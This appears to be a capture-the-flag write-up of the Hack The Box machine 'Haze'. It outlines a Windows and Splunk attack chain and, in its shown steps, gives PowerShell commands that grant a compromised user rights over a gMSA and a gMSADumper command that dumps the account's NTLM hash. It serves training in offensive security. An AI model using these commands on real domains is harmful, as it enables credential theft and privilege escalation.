description: Haze is a hard difficulty Windows machine focused on web exploitation, domain abuse, and Windows privilege escalation. Initial access is gained by exploiting a Splunk Arbitrary File Read (CVE-2024-36991) to extract an LDAP bind password, which is then decrypted using splunk.secret. With valid credentials, a BloodHound scan reveals further accounts, and password spraying provides access to a user with GMSA management rights. This allows abuse of the PrincipalsAllowedToRetrieveManagedPassword property to dump hashes and pivot into a privileged service account. Using Shadow Credentials, access is escalated to another user. Backup files expose more credentials, eventually giving admin access to Splunk. Finally, a custom app upload enables a reverse shell, and SeImpersonatePrivilege is abused to impersonate SYSTEM, completing the escalation chain.

The third Splunk service turned out to be the most interesting one from an unauthenticated perspective, since it leaked information about the Splunk instance itself. This interface disclosed the Splunk build version (`9.2.1`), which would prove useful when searching for applicable CVE's.

Looking through BloodHound, we found that `mark.adams` was a member of the `gMSA_Managers` group.

![](/assets/img/HTB-Haze_5.png)

Since `gMSA_Managers` is likely to carry rights over group managed service accounts, we listed every managed service account in the domain to identify a suitable target.

```shell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Filter * -Properties * | Select SamAccountName,PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPasswordInterval,ServicePrincipalNames,DistinguishedName
SamAccountName                             : Haze-IT-Backup$
PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}
msDS-ManagedPasswordInterval               : 30
ServicePrincipalNames                      :
DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
```

Since `mark.adams` belongs to the `gMSA_Managers` group, it was reasonable to assume that members of this group hold the right to add principals to the `PrincipalsAllowedToRetrieveManagedPassword` property of the `Haze-IT-Backup` gMSA. Abusing this group membership, we granted `mark.adams` the right to retrieve the managed password himself :

```shell
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Set-ADServiceAccount -Identity Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword mark.adams
```

With the appropriate rights granted, we retrieved the `Haze-IT-Backup` gMSA's password hash using [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) :

```shell
┌──[tatsuki@parrot]─[/opt/gMSADumper]
└──╼ [★]$ python3 gMSADumper.py -u 'mark.adams' -p 'Ld@pXXXXXXXXXXXXX2k24' -d haze.htb
```

This gave us the NTLM hash of the gMSA account, which we could now use to authenticate as `Haze-IT-Backup$`.
